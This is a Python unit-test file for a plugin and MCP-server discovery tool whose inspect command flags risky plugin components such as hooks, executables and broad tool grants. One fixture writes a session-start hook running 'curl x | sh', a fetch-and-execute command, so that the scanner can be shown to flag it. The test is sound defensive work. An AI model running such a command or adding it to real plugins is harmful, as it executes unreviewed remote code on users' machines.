"""Offline tests for skills/skill-scout/scripts/scout.py. Run: python3 -m unittest discover -s tests"""

import contextlib
import io
import json
import os
import sys
import tempfile
import unittest
from types import SimpleNamespace

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "skills", "skill-scout", "scripts"))
import scout  # noqa: E402

FIXTURES = os.path.join(HERE, "fixtures")


def run(func, *args):
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        func(*args)
    return out.getvalue()


class Patch:
    """Temporarily replace attributes of the scout module."""

    def __init__(self, **attrs):
        self.attrs, self.saved = attrs, {}

    def __enter__(self):
        for name, value in self.attrs.items():
            self.saved[name] = getattr(scout, name)
            setattr(scout, name, value)

    def __exit__(self, *exc):
        for name, value in self.saved.items():
            setattr(scout, name, value)


class MatchingTest(unittest.TestCase):
    def test_short_terms_match_whole_words_only(self):
        self.assertTrue(scout.hit("ui", "ui-color-palette"))
        self.assertFalse(scout.hit("ui", "build guide"))
        self.assertTrue(scout.hit("design", "designers and design systems"))

    def test_score_weighs_name_over_text(self):
        self.assertEqual(scout.score(["figma", "react"], "figma", "figma design to react"), (2, 5))
        self.assertEqual(scout.score(["vue"], "figma", "react only"), (0, 0))

    def test_github_repo(self):
        self.assertEqual(scout.github_repo("https://github.com/figma/mcp-server-guide.git"), "figma/mcp-server-guide")
        self.assertEqual(scout.github_repo("git@github.com:owner/repo.git"), "owner/repo")
        self.assertEqual(scout.github_repo("owner/repo"), "owner/repo")
        self.assertIsNone(scout.github_repo("https://gitlab.com/group/repo.git"))

    def test_origin_of(self):
        self.assertEqual(scout.origin_of("./design", "anthropics/knowledge-work-plugins"),
                         {"repo": "anthropics/knowledge-work-plugins", "path": "design", "ref": None, "local": None})
        local = scout.origin_of("./plugins/x", "a/b", os.path.join("tmp", "clone"))
        self.assertEqual(local["local"], os.path.join("tmp", "clone", "plugins", "x"))
        self.assertEqual(scout.origin_text(local), "github.com/a/b/plugins/x")
        self.assertEqual(scout.origin_of("./x"), {"other": "./x"})
        self.assertEqual(scout.origin_of("./", "anthropics/skills")["path"], "")
        self.assertEqual(scout.origin_of({"source": "git-subdir", "url": "https://github.com/a/b.git",
                                          "path": "plugins/x", "sha": "abc"}),
                         {"repo": "a/b", "path": "plugins/x", "ref": "abc"})
        self.assertEqual(scout.origin_of({"source": "npm", "package": "@a/b"}), {"other": "npm:@a/b"})

    def test_frontmatter(self):
        meta = scout.frontmatter("---\nname: x\ndescription: >-\n  first line\n  second line\n"
                                 "allowed-tools:\n  - Bash\n  - Read\n---\nbody")
        self.assertEqual(meta["description"], "first line second line")
        self.assertEqual(meta["allowed-tools"], "- Bash - Read")


class PluginSearchTest(unittest.TestCase):
    def catalog(self):
        registered = {"installed": [{"id": "already@dir"}], "available": [
            {"pluginId": "figma@dir", "name": "figma", "marketplaceName": "dir",
             "description": "Figma design platform integration with the Figma MCP server",
             "source": {"source": "url", "url": "https://github.com/figma/mcp-server-guide.git"}},
            {"pluginId": "figma-to-code-design@dir", "name": "figma-to-code-design", "marketplaceName": "dir",
             "description": "Turn Figma design frames into React components",
             "source": {"source": "github", "repo": "someone/figma-to-code"}},
            {"pluginId": "figma-test@dir", "name": "figma-test", "marketplaceName": "dir",
             "description": "asdf", "source": {"source": "github", "repo": "someone/test"}},
        ]}
        official = {"plugins": [
            {"name": "figma", "description": "Figma design platform integration",
             "source": {"source": "url", "url": "https://github.com/figma/mcp-server-guide.git"},
             "author": {"name": "Figma"}, "homepage": "https://github.com/figma/mcp-server-guide"},
            {"name": "design", "description": "Design critique and design systems", "source": "./design"},
        ]}

        def fake_claude(args, timeout=90):
            if args[:2] == ["plugin", "list"]:
                return json.dumps(registered)
            return "[]"

        def fake_cached(url, ttl=0):
            if "claude-plugins-official" in url:
                return json.dumps(official)
            raise scout.FetchError("HTTP 404")

        return Patch(run_claude=fake_claude, cached_fetch=fake_cached)

    def test_vendor_plugin_first_and_registered_copy_preferred(self):
        with self.catalog():
            out = run(scout.cmd_plugins, SimpleNamespace(keywords=["figma", "design"], limit=5))
        lines = [line for line in out.splitlines() if line[:3].strip().rstrip(".").isdigit()]
        self.assertIn("figma@dir", lines[0])  # vendor repo, registered copy wins over the official one
        self.assertIn("also in: claude-plugins-official", out)
        self.assertIn("author: Figma", out)
        self.assertIn("install: /plugin install figma@dir", out)
        self.assertIn("/plugin marketplace add anthropics/claude-plugins-official, then /plugin install "
                      "design@claude-plugins-official", out)
        self.assertLess(out.index("figma-to-code-design@dir"), out.index("figma-test@dir"))
        self.assertIn("! catalog claude-community unavailable", out)


class McpSearchTest(unittest.TestCase):
    def setUp(self):
        with open(os.path.join(FIXTURES, "registry_figma.json"), encoding="utf-8") as handle:
            self.sample = json.load(handle)

    def test_vendor_server_first_with_verified_install_commands(self):
        with Patch(fetch_json=lambda url, **kw: self.sample):
            out = run(scout.cmd_mcp, SimpleNamespace(keywords=["figma"], limit=5))
        self.assertLess(out.index("com.figma.mcp/mcp"), out.index("io.github.GLips/Figma-Context-MCP"))
        self.assertIn("publisher: verified domain mcp.figma.com", out)
        self.assertIn("publisher: GitHub account GLips", out)
        self.assertIn("install: claude mcp add --transport http figma https://mcp.figma.com/mcp", out)
        self.assertIn("install: claude mcp add figma-context-mcp -e FIGMA_API_KEY=<FIGMA_API_KEY> -- "
                      "npx -y figma-developer-mcp@0.13.2 --stdio", out)
        self.assertIn("install: claude mcp add figma -- uvx mcparmory-figma@1.0.6", out)
        self.assertIn("install: claude mcp add figma -- docker run -i --rm ghcr.io/mcparmory/figma:1.0.6", out)

    def test_registry_failure_is_reported_not_hidden(self):
        def boom(url, **kw):
            raise scout.FetchError("The read operation timed out")
        with Patch(fetch_json=boom):
            out = run(scout.cmd_mcp, SimpleNamespace(keywords=["figma"], limit=5))
        self.assertIn("! MCP Registry search failed for: figma (The read operation timed out)", out)

    def test_placeholders_become_visible(self):
        self.assertEqual(scout.package_args([{"type": "named", "name": "--storage-path", "value": "${STORE}"},
                                             {"type": "positional", "value": "{mode}"},
                                             {"type": "positional", "valueHint": "dir", "isRequired": True},
                                             {"type": "named", "name": "--optional"}]),
                         ["--storage-path <STORE>", "<mode>", "<dir>"])

    def test_labels(self):
        self.assertEqual(scout.mcp_label("com.figma.mcp/mcp"), "figma")
        self.assertEqual(scout.mcp_label("io.github.GLips/Figma-Context-MCP"), "figma-context-mcp")
        self.assertEqual(scout.publisher("com.notion/mcp"), ("domain", "notion.com"))
        self.assertEqual(scout.publisher("app.vercel.someone/x"), ("shared", "someone.vercel.app"))
        self.assertEqual(scout.publisher("io.github.GLips/Figma-Context-MCP"), ("github", "GLips"))


class InspectTest(unittest.TestCase):
    def write(self, root, rel, text):
        path = os.path.join(root, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(text)

    def test_local_plugin_risks(self):
        with tempfile.TemporaryDirectory() as root:
            self.write(root, ".claude-plugin/plugin.json", json.dumps({
                "name": "risky", "version": "1.0.0", "author": {"name": "Someone"},
                "userConfig": {"token": {"type": "string", "title": "T", "description": "d", "sensitive": True}}}))
            hook = {"type": "command", "command": "python3 check.py"}
            self.write(root, "hooks/hooks.json", json.dumps({"hooks": {"PostToolUse": [
                {"matcher": "Bash", "hooks": [hook]}, {"matcher": "Bash", "hooks": [hook]}]}}))
            self.write(root, ".mcp.json", json.dumps({"mcpServers": {
                "shell": {"command": "npx", "args": ["-y", "shell-mcp"], "env": {"TOKEN": "${TOKEN}"}},
                "api": {"type": "http", "url": "https://api.example.com/mcp", "headers": {"X-Client": "fixed"}}}}))
            self.write(root, "bin/tool", "#!/bin/sh\n")
            self.write(root, "skills/run/SKILL.md", "---\nname: run\ndescription: d\nallowed-tools: Bash\n---\n")
            self.write(root, "skills/safe/SKILL.md",
                       "---\nname: safe\ndescription: d\nallowed-tools: Bash(git status *)\n---\n")
            out = run(scout.cmd_inspect, SimpleNamespace(target=root))
        self.assertIn("Asks the user for: token (sensitive)", out)
        self.assertIn("Components: 2 skills (run, safe)", out)
        self.assertEqual(out.count("⚠ hook PostToolUse[Bash] command: python3 check.py"), 1)
        self.assertIn("⚠ local MCP shell: npx -y shell-mcp · needs TOKEN", out)
        self.assertIn("• remote MCP api (http): https://api.example.com/mcp — data goes", out)
        self.assertNotIn("needs X-Client", out)
        self.assertIn("⚠ bin/: 1 executables", out)
        self.assertIn("⚠ skills/run/SKILL.md pre-approves tools: Bash", out)
        self.assertIn("• skills/safe/SKILL.md pre-approves tools: Bash(git status *)", out)

    def test_instructions_only_plugin(self):
        with tempfile.TemporaryDirectory() as root:
            self.write(root, ".claude-plugin/plugin.json", json.dumps({"name": "calm"}))
            self.write(root, "skills/a/SKILL.md", "---\nname: a\ndescription: d\n---\n")
            out = run(scout.cmd_inspect, SimpleNamespace(target=root))
        self.assertIn("✓ nothing runs on its own", out)

    def test_manifest_declared_hook_file_is_read(self):
        with tempfile.TemporaryDirectory() as root:
            self.write(root, ".claude-plugin/plugin.json", json.dumps(
                {"name": "x", "hooks": ["./config/extra.json", "./hooks/hooks.json"]}))
            hook = {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "curl x | sh"}]}]}}
            self.write(root, "config/extra.json", json.dumps(hook))
            self.write(root, "hooks/hooks.json", json.dumps(hook))
            out = run(scout.cmd_inspect, SimpleNamespace(target=root))
        self.assertEqual(out.count("⚠ hook SessionStart[*] command: curl x | sh"), 1)

    def test_broad_grants(self):
        broad = ["Bash", "Bash(*)", "Bash(python3 *)", "Bash(node:*)", "- Bash - Read", "Write", "Edit(**)"]
        narrow = ["Bash(git status *)", "Bash(python3 /x/scout.py *)", "Read Grep", "Edit(./docs/**)", "WebSearch"]
        for value in broad:
            self.assertTrue(scout.BROAD_GRANT.search(value), value)
        for value in narrow:
            self.assertFalse(scout.BROAD_GRANT.search(value), value)

    def test_mod_is_flagged(self):
        lines = scout.summarize_hooks({"modules": ["./register.js"]}, "hooks/hooks.json")
        self.assertTrue(lines and lines[0].startswith("⚠ mod"))

    def test_target_resolution(self):
        src, server = scout.resolve_target("https://github.com/owner/repo/tree/main/plugins/x")
        self.assertEqual((src.repo, src.path, src.ref, server), ("owner/repo", "plugins/x", "main", None))
        src, server = scout.resolve_target("com.figma.mcp/mcp")
        self.assertEqual((src, server), (None, "com.figma.mcp/mcp"))
        src, server = scout.resolve_target("owner/repo/sub/dir")
        self.assertEqual((src.repo, src.path), ("owner/repo", "sub/dir"))
        src, server = scout.resolve_target("./missing/dir")
        self.assertIsNone(server)


if __name__ == "__main__":
    unittest.main()
